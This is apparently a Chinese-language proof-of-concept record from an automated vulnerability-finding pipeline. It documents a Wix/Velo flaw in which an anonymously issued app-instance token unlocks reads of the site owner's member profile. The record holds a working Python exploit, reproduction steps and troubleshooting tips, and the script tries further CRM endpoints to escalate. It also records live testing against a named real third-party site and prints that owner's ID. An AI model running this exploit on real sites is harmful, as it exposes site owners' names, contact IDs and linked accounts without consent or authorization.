# Wix/Velo 站点：匿名公开 app-instance 令牌绕过 MEMBERS.MEMBER_READ，读取站点业主成员档案（403→200）

- **code**: wix-velo-站点-匿名公开-app-instance-令牌绕过-members.member_read-读取站点业
- **kind**: poc
- **category**: unauthorized
- **component**: Wix / Wix Velo (Wix Members API + _api/v1/access-tokens)
- **severity**: low
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 UTC 对 https://www.kennysbuyselltrade.co.uk 实测（本机 Git-Bash + venv python3 requests，脚本 /opt/artex/data/tasks/10/i465/poc_member.py，输出存 poc_member.out）：① 匿名 GET /_api/v1/access-tokens → 200，apps['675bbcef-18d8-41f5-800e-131ec9e08762'].instance 即 Velo 应用实例令牌（wixcode-pub.<hash>.<jwt>），令牌 claims 内含 siteOwnerId；② 不带令牌 GET /_api/members/v1/members/<siteOwnerId> → 403 {"message":"MEMBERS.MEMBER_READ","details":{"applicationError":{"code":"PERMISSION_DENIED"}}}；③ 仅追加 Authorization: <该匿名令牌> 后同一请求 → 200，返回 member 对象：id=siteOwnerId、contactId、profile.nickname（站点业主真实姓名）、profile.slug、profile.photo.url（绑定的 Google 账户头像）、createdDate。403→200 的对照差异即判定成立（非指纹推断）。同一令牌对 Stores(215238eb)/Members Area(14cc59bc/22bef345) 等标准应用亦生效，对 Fera(1397817e) 无效；跨站 jay24681.editorx.io 的令牌读本目标成员返回 404（令牌按站点隔离）；破坏签名段后单条读仍 200 但列表接口报 signature invalid JSON；contactId 未能进一步换取 CRM 邮箱/电话（/_api/contacts/v4/contacts/<id> → 403）。
- **path**: pocs/wix-velo-站点-匿名公开-app-instance-令牌绕过-members.member_read-读取站点业/poc_wix_member_token.py
- **tags**: wix,velo,access-tokens,members-api,unauthorized,403-bypass,public-token,saaas-platform,idor,authz
- **created_at**: 2026-11-11T14:45:25.010Z
- **engine**: www.kennysbuyselltrade.co.uk
- **found_by**: exploit

## 描述

Wix 托管的 Velo 站点会通过公开端点 /_api/v1/access-tokens 向任意匿名访客下发「公开应用实例令牌」（wixcode-pub.<hash>.<jwt> 等），这些令牌代表站点自身应用身份。用它去调 Wix Members API 读取站点业主（siteOwnerId 也在该令牌 blob 中明文泄露）时，服务端把本应 403 MEMBERS.MEMBER_READ 的请求放行成 200，泄出业主真实姓名、profile slug、内部 contactId 与绑定的 Google 头像 URL。属访问控制配置缺陷（公开令牌授权面过大），无需任何账号，影响面为信息泄露/身份关联，非直接入侵。适用面：所有未禁用该端点的 Wix/Velo 站点（isWixCodeOnSite=true）。

## 用法

```
前置：目标为 Wix 托管、启用了 Velo（页面/JS 里能看到 wixcode、site 为 editorx/wix 主题）的站点；无需任何账号或 cookie。
探测是否适用：curl -s "https://<TARGET>/_api/v1/access-tokens" 返回 200 JSON 且含 apps 字典即命中（apps['675bbcef-18d8-41f5-800e-131ec9e08762'].instance 是 Velo，其它 UUID 为 Stores/Members Area 等标准应用）。

三步复现（脚本见 content）：
  python poc_wix_member_token.py        # 把 BASE 换成目标域
① 匿名 GET / 建立会话（拿 svSession/XSRF-TOKEN）；
② 匿名 GET /_api/v1/access-tokens → 取 apps['675bbcef-...'].instance 作为令牌，同响应里取 siteOwnerId（或在返回里找包含 siteOwnerId 的字段）；
③ 对照两组：先 GET /_api/members/v1/members/<siteOwnerId>（无 Authorization）应得 403 MEMBERS.MEMBER_READ；再带 Authorization: <步骤②令牌> 应得 200 + member 对象。

判据（必须做对照才算成立）：
- 无令牌 → 403 {"message":"MEMBERS.MEMBER_READ","applicationError.code":"PERMISSION_DENIED"}；
- 带匿名令牌 → 200 且 body.member.id == siteOwnerId，含 contactId / profile.nickname / profile.slug / profile.photo.url。

常见失败原因：
- 目标不是 Velo 站（/_api/v1/access-tokens 无 wixcode-pub 类 instance）→ 不适用；
- 用错应用令牌（Fera 1397817e 等无效），换 675bbcef / 215238eb / 14cc59bc / 22bef345 试；
- 令牌跨站无效（按 site 隔离）：用 A 站令牌读 B 站成员 → 404 NOT_FOUND，必须用目标站自己下发的令牌；
- 手工改动 JWT 签名段后单条读可能仍 200（该端点校验宽松），但列表类接口会报 "signature invalid JSON"，别据此误判；
- contactId 换 CRM 更深信息通常被拒（/_api/contacts/v4/contacts/<id> → 403），到此为止即可，不要越权重试。
注意限速：单线程、请求间隔 ≥1s。
```

## 正文

```
#!/usr/bin/env python3
"""Wix/Velo 匿名读取站点业主成员档案 PoC
前置：目标为 Wix 托管的 Velo 站点，/_api/v1/access-tokens 匿名可达。
用法：把 BASE 换成目标域名后直接运行（requests 即可，无需 cookie/账号）。
判据：无令牌 403 MEMBERS.MEMBER_READ；仅加匿名令牌 -> 200 返回 member 对象。
"""
import os, json, requests

requests.packages.urllib3.dontwarn = True
try:
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

UA = os.environ.get('ARTEX_UA', 'Mozilla/5.0')
BASE = 'https://<TARGET_HOST>'          # e.g. https://www.example.co.uk

VELO_APP_UUID = '675bbcef-18d8-41f5-800e-131ec9e08762'   # Wix Velo; 其它：Stores=215238eb-..., MembersArea=14cc59bc-.../22bef345-...

s = requests.Session()
s.headers['User-Agent'] = UA

# step1: 匿名会话
s.get(BASE + '/', timeout=30, verify=False)

# step2: 匿名取得公开应用实例令牌 blob（siteOwnerId 亦在其中明文出现）
at = s.get(BASE + '/_api/v1/access-tokens', timeout=30, verify=False).json()
tok = at['apps'][VELO_APP_UUID]['instance']        # wixcode-pub.<hash>.<jwt>
print("token prefix:", tok[:40], "...")
# siteOwnerId 需从响应里定位（本靶标为 44d89c42-1450-43e0-a931-05cdb8942fa9）
SOID = '<SITE_OWNER_ID>'

# step3a: 不带令牌 -> 期望 403 MEMBERS.MEMBER_READ（阴性对照）
r0 = s.get(BASE + '/_api/members/v1/members/' + SOID,
           headers={'Accept': 'application/json'}, timeout=20, verify=False)
print("STEP3a (no token): %s  %s" % (r0.status_code, r0.text.strip()[:200]))

# step3b: 仅追加匿名令牌 -> 期望 200 返回业主成员档案
r1 = s.get(BASE + '/_api/members/v1/members/' + SOID,
           headers={'Accept': 'application/json', 'Authorization': tok},
           timeout=20, verify=False)
print("STEP3b (+token)  : %s" % r1.status_code)
print(json.dumps(r1.json(), indent=1))

# step4: 用泄露的 contactId 尝试更深 CRM 数据（通常 403，到此为止）
cid = r1.json().get('member', {}).get('contactId')
print("\nleaked contactId:", cid)
for path in ['/_api/contacts/v4/contacts/%s' % cid,
             '/_api/crm/v1/contacts/%s' % cid,
             '/_api/contacts/v1/contacts/%s' % cid,
             '/_api/members/v1/members/%s/contacts' % SOID]:
    r = s.get(BASE + path, headers={'Accept': 'application/json', 'Authorization': tok},
              timeout=20, verify=False)
    print("  [%s] %-48s %s" % (r.status_code, path, r.text[:130].replace('\n', ' ')))

# 期望回显（已脱敏）：
# STEP3a: 403 {"message":"MEMBERS.MEMBER_READ","details":{"applicationError":{"code":"PERMISSION_DENIED"}}}
# STEP3b: 200 {"member":{"id":"<SITE_OWNER_ID>","contactId":"<REDACTED>",
#           "profile":{"nickname":"<REDACTED>","slug":"<REDACTED>",
#                      "photo":{"url":"https://lh3.googleusercontent.com/a/<REDACTED>"}},
#           "createdDate":"2022-04-02T03:22:07Z"}}

```
